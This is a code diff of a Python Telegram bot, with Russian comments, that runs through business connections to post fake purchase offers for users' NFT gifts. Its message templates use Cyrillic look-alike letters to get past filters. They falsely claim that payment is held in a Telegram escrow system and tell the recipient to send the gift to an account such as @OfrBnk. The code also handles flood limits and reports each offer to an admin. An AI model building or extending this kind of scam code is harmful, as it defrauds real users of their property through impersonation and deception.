@@ -134,6 +134,7 @@ def parse_nft_link(link: str):
 
 def parse_offer_command(text: str):
     parts = text.strip().split()
+    # Теперь команда без слэша
     if len(parts) < 3 or parts[0].lower() != "svin": return None
     link, amount = parts[1], parts[2]
     if not amount.isdigit(): return None
@@ -151,22 +152,15 @@ async def send_with_fallback(bc_id, chat_id, text, reply_markup=None):
     for attempt in range(1, 4):
         try:
             return await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, business_connection_id=bc_id)
-        except TelegramRetryAfter as e: 
-            logger.warning(f"[send] FloodWait {e.retry_after}s. Ждем...")
-            await asyncio.sleep(e.retry_after + 1)
+        except TelegramRetryAfter as e: await asyncio.sleep(e.retry_after + 1)
         except TelegramBadRequest as e:
-            if "PEER_FLOOD" in str(e): 
-                logger.error(f"[send] 🚨 PEER_FLOOD detected! Ожидание 24-48ч.")
-                raise
-            logger.warning(f"[send] BadRequest: {e}. Пробуем без эмодзи...")
+            if "PEER_FLOOD" in str(e): raise
             clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
             if reply_markup:
                 for row in reply_markup.inline_keyboard:
                     for btn in row: btn.icon_custom_emoji_id = None
-            try: 
-                return await bot.send_message(chat_id=chat_id, text=clean_text, reply_markup=reply_markup, business_connection_id=bc_id)
-            except Exception as e2:
-                logger.error(f"[send] Fallback failed: {e2}")
+            try: return await bot.send_message(chat_id=chat_id, text=clean_text, reply_markup=reply_markup, business_connection_id=bc_id)
+            except Exception:
                 if attempt == 3: raise
 
 async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
@@ -175,10 +169,6 @@ async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None
         return True
     except TelegramBadRequest as e:
         if "message is not modified" in str(e): return True
-        if "PEER_FLOOD" in str(e):
-            logger.error(f"[edit] 🚨 PEER_FLOOD detected! Ожидание 24-48ч.")
-            return False
-        logger.warning(f"[edit] BadRequest: {e}. Пробуем без эмодзи...")
         clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
         if reply_markup:
             for row in reply_markup.inline_keyboard:
@@ -262,12 +252,14 @@ async def handle_offer(message: Message) -> None:
     sender_id = message.from_user.id if message.from_user else 0
     sender_username = message.from_user.username if message.from_user else None
 
+    # 1. Проверка, нажимал ли человек /start (или писал svin в личку)
     if sender_id not in started_users:
         logger.warning(f"[offer] User {sender_id} not started, deleting message.")
         try: await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[message.message_id])
         except: pass
         return
 
+    # 2. Проверка на бан
     if is_banned(sender_id, sender_username):
         try: await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[message.message_id])
         except: pass
@@ -275,6 +267,7 @@ async def handle_offer(message: Message) -> None:
         except: pass
         return
 
+    # 3. Проверка прав
     try:
         connection = await bot.get_business_connection(business_connection_id=bc_id)
         rights = connection.rights
@@ -287,6 +280,7 @@ async def handle_offer(message: Message) -> None:
         logger.error(f"[BC] Ошибка прав: {e}")
         return
 
+    # 4. Парсинг
     data = parse_offer_command(message.text)
     if not data: return
 
@@ -302,10 +296,15 @@ async def handle_offer(message: Message) -> None:
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
     emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM if data["currency"] == "gram" else EMOJI_STARS}">{"🪙" if data["currency"] == "gram" else "⭐"}</tg-emoji>'
 
-    text = f"Usеr <b>{message.from_user.full_name if message.from_user else 'Unknown'}</b> оffеrs уоu <b>{amount_fmt}</b> {emoji} fоr thе gift {gift_display}.\n\nТhе оffеr ls vаIid fоr <b>6 h. 0 min</b>.."
+    text = f"Usеr <b>{sender_name}</b> оffеrs уоu <b>{amount_fmt}</b> {emoji} fоr thе glft {gift_display}.\n\Thе оffеr ls vаIid fоr <b>6 h. 0 min</b>.."
 
     offer_id = uuid.uuid4().hex[:12]
-    
+    offers[offer_id] = {
+        **data, "bc_id": bc_id, "chat_id": message.chat.id, "accepted": False,
+        "sender_name": sender_name, "sender_username": sender_username, "sender_id": sender_id,
+        "owner_username": "unknown", "owner_id": "0",
+    }
+
     keyboard = InlineKeyboardMarkup(
         inline_keyboard=[[
             InlineKeyboardButton(text="Decline", callback_data=f"dec:{offer_id}", icon_custom_emoji_id=EMOJI_DECLINE_EN),
@@ -315,18 +314,10 @@ async def handle_offer(message: Message) -> None:
 
     try:
         sent = await send_with_fallback(bc_id=bc_id, chat_id=message.chat.id, text=text, reply_markup=keyboard)
-        
-        # Сохраняем оффер ТОЛЬКО после успешной отправки
-        offers[offer_id] = {
-            **data, "bc_id": bc_id, "chat_id": message.chat.id, "accepted": False,
-            "sender_name": sender_name, "sender_username": sender_username, "sender_id": sender_id,
-            "owner_username": "unknown", "owner_id": "0", "msg_id": sent.message_id
-        }
-        
+        offers[offer_id]["msg_id"] = sent.message_id
         await send_log_to_admin(offers[offer_id])
-        
     except Exception as e:
-        logger.error(f"[offer-send] Ошибка: {e}")
+        log_telegram_error("offer-send", e, chat_id=message.chat.id, bc_id=bc_id)
 
 @dp.callback_query(F.data.startswith("dec:"))
 async def handle_decline(callback: CallbackQuery) -> None:
@@ -350,28 +341,21 @@ async def handle_accept(callback: CallbackQuery) -> None:
     await asyncio.sleep(0.3)
 
     amount_fmt = f"{int(data['amount']):,}"
-    gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
-    gift_display = f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'
+    gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
     
     if data["currency"] == "gram":
-        emoji, cur_u, cur_l = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>', "GRАM", "GRАM"
+        emoji, cur_word = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>', "GRАM"
     else:
-        emoji, cur_u, cur_l = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>', "Stаrs", "stаrs"
+        emoji, cur_word = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>', "Stаrs"
 
-    order_id = f"ТG-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
-    
+    sold_emoji = f'<tg-emoji emoji-id="{EMOJI_SOLD}">✨</tg-emoji>'
+
     accept_text = (
-        f"<b>NFТ Dеаl</b>\n\n<b>Оrdеr</b> #{order_id}\n\n"
-        f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} thrоugh thе ТеIеgrаm еsсrоw sуstеm. "
-        f"Тhе {cur_l} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wlII bе аutоmаtiсаIIy сrеditеd tо уоur ТеIеgrаm {cur_u} bаIаnсе right аftеr thе gift is trаnsfеrrd.\n\n"
-        f"<b>lnstruсtlоns tо соmрlеtе thе dеаl:</b>\n\n"
-        f"1. Sеnd tо: @offerBnk\n"
-        f"2. СIiсk «Sеnd Gift» аnd sеlесt {gift_display}\n"
-        f"3. Соnfirm thе glft trаnsfеr.\n\n"
-        f"ТеIеgrаm wiII rесоrd thе trаnsасtiоn аnd instаntIу сrеdit <b>{amount_fmt}</b> {emoji} tо уоur bаIаnсе. Тhе rеsеrvаtiоn is vаlid fоr 24 hоurs."
+        f"{sold_emoji} Gift {gift_display} hаs bееn suссеssfuIlу sоId fоr <b>{amount_fmt}</b> {emoji} <b>{cur_word}</b>!\n\n"
+        f"То соmрIеtе thе dеаI, Тransfеr thе gift tо thе buуеr tо rесеlvе уоur {cur_word}"
     )
 
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Send Gift", url="tg://send_gift?to=offerBnk")]])
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Send Gift", url="tg://send_gift?to=OfrBnk")]])
     await edit_with_fallback(bc_id=data["bc_id"], chat_id=data["chat_id"], message_id=data["msg_id"], text=accept_text, reply_markup=keyboard)
     await update_log_message(data, "accepted", is_read=True)
 
